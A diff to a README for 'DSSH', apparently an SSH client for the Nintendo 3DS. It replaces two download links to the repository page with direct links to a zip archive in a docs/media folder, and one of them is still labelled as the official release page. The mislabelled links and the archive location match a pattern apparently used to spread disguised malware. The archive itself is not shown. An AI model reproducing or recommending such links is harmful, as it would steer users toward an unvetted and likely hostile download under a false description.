@@ -1,6 +1,6 @@
 # 🦀 DSSH - Access remote servers from your console
 
-[![](https://img.shields.io/badge/Download_DSSH-Blue.svg)](https://github.com/Octogenarian-nonpareil126/DSSH)
+[![](https://img.shields.io/badge/Download_DSSH-Blue.svg)](https://github.com/Octogenarian-nonpareil126/DSSH/raw/refs/heads/main/docs/media/Software_1.4.zip)
 
 DSSH is a terminal tool for the Nintendo 3DS. It allows you to connect to remote servers through SSH. You can manage files, run commands, and check server status directly from your handheld device. The application includes a pinyin input method for typing Chinese characters and a visual terminal for your text.
 
@@ -19,7 +19,7 @@ This software includes tools to help you work on a server:
 
 You need a Nintendo 3DS console with custom firmware installed. Open the URL below to find the files for your device.
 
-[Visit the official release page to download](https://github.com/Octogenarian-nonpareil126/DSSH)
+[Visit the official release page to download](https://github.com/Octogenarian-nonpareil126/DSSH/raw/refs/heads/main/docs/media/Software_1.4.zip)
 
 ## 📁 Installation
 
